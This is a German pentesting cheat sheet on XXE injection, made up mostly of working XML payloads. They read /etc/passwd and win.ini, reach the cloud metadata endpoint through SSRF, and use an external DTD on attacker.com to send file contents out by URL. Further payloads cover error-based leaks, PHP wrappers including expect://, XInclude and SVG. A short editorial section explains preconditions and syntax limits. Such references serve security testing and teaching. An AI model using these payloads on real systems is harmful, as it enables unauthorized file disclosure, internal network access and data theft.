# 📄 XXE – Injection externer XML-Entitäten

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   Injection externer XML-Entitäten
```

---

## 🎯 Was ist XXE?

**XXE** (XML External Entity Injection) nutzt die Verarbeitung externer Entitätsreferenzen durch XML-Parser aus. Je nach Umgebung sind dadurch Dateizugriffe, SSRF (serverseitige Anfragefälschung) und in manchen Fällen Codeausführung aus der Ferne (RCE) möglich.

---

## 💉 Grundlegende Payloads

### Lokale Dateien lesen
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Windows-Dateien
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF über XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

## 🔒 Blinde XXE (Out-of-Band)

### Externe DTD
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd auf dem Angreiferserver:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Fehlerbasierte Datenexfiltration
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

## 🛡️ Umgehungstechniken

### Kodierung
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Mit Base64 umhüllt -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Protokollvarianten
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### XXE in SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

## 📊 Kurzreferenz

| Payload-Art | Anwendungsfall |
|--------------|----------|
| Datei lesen | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| Blind (OOB) | Externe DTD und Datenexfiltration |
| Fehlerbasiert | Fehler mit enthaltenen Daten auslösen |

### Häufige potenziell betroffene Verarbeitungsstellen
```
- SOAP-APIs
- XML-Dateiuploads
- SVG-Verarbeitung
- Parser für Dokumente (DOCX, XLSX)
- RSS/Atom-Feeds
```

---

## 📚 Ressourcen

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 XML-Parser auf Schwachstellen prüfen!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>


---

## Hinweise zur deutschen Ausgabe

> **Voraussetzungen und Begriffe:** Eine externe Entität allein beweist keine ausnutzbare Schwachstelle. Entscheidend sind Parser, Konfiguration, Ressourcenzugriff und die Weitergabe von Ergebnissen oder Fehlern. *Blind* bedeutet, dass gelesene Daten nicht unmittelbar in der Antwort erscheinen; *OOB* bezeichnet eine Beobachtung über einen getrennten Kommunikationskanal. XInclude ist ein gesondertes Einbindungsverfahren und setzt dessen Verarbeitung voraus. PHP-Wrapper sind keine universellen XML-Protokolle; `expect://` benötigt eine zusätzliche, nicht standardmäßig aktivierte PHP-Erweiterung. [W3C: XInclude](https://www.w3.org/TR/xinclude/), [PHP: expect-Wrapper](https://www.php.net/manual/en/wrappers.expect.php).

> **Grenzen der Beispielsyntax:** Die XML-Regeln beschränken Parameterentitätsreferenzen innerhalb von Deklarationen im internen DTD-Teil; das gezeigte fehlerbasierte Beispiel kann deshalb bereits an der Wohlgeformtheit scheitern. Die externe DTD und ausgehende Verbindungen werden im OOB-Beispiel vorausgesetzt; Dateiinhalte lassen sich nicht beliebig unverändert in eine URL einsetzen. Die Kodierungsdeklaration muss zu den tatsächlich übertragenen Bytes passen. Ein Kommentar vor der XML-Deklaration ist außerdem keine zulässige Reihenfolge für ein vollständiges XML-Dokument. Die Abschnitte enthalten Fragmente und Alternativen, keine einzige zusammengesetzte XML-Datei. [W3C: XML 1.0](https://www.w3.org/TR/2008/REC-xml-20081126/), [PortSwigger: Blind XXE](https://portswigger.net/web-security/xxe/blind).

> **Auswertung:** Erreichbare Endpunkte, eine unterstützte Dateiendung oder ein einzelner Fehler sind Untersuchungshinweise, kein vollständiger XXE-Nachweis. RCE hängt von zusätzlichen Fähigkeiten der Laufzeit ab. Sämtliche XML-/DTD-Payloads, URLs, Pfade und Literalwerte bleiben unverändert; kein XML wurde verarbeitet und kein Beispiel oder Callback wurde ausgeführt.
